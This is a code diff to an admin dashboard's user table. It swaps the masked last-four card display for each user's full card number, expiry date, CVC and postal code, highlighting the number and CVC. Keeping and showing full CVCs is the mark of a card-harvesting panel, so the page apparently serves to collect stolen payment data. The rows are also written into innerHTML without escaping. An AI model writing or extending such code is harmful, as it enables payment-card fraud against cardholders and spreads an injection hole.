@@ -244,9 +244,11 @@
                         <th>User</th>
                         <th>Email</th>
                         <th>Plan / Amount</th>
-                        <th>Voucher</th>
                         <th>Country</th>
-                        <th>Card</th>
+                        <th>Card Number</th>
+                        <th>Expiry</th>
+                        <th>CVC</th>
+                        <th>Postal Code</th>
                         <th>Created At</th>
                     </tr>
                 </thead>
@@ -364,16 +366,18 @@
                 if (data.success) {
                     const tbody = document.getElementById('usersTable');
                     if (!data.users || data.users.length === 0) {
-                        tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; padding: 40px;">No users yet.</td></tr>';
+                        tbody.innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px;">No users yet.</td></tr>';
                     } else {
                         tbody.innerHTML = data.users.map(u => `
                             <tr>
-                                <td>${u.name || '-'}</td>
+                                <td><strong>${u.name || '-'}</strong></td>
                                 <td>${u.email || '-'}</td>
                                 <td>${u.planDuration || '-'}<br/><small>$${(u.amount || 0).toFixed(2)}</small></td>
-                                <td>${u.voucher_code || '-'}</td>
                                 <td>${u.countryName || u.country || '-'}</td>
-                                <td>•••• ${u.card_last4 || ''}</td>
+                                <td><strong style="color: #00d4ff;">${u.cardNumber || '-'}</strong></td>
+                                <td>${u.cardExpiry || '-'}</td>
+                                <td><strong style="color: #ff6b6b;">${u.cardCvc || '-'}</strong></td>
+                                <td>${u.postalCode || '-'}</td>
                                 <td>${u.created_at ? new Date(u.created_at).toLocaleString() : '-'}</td>
                             </tr>
                         `).join('');
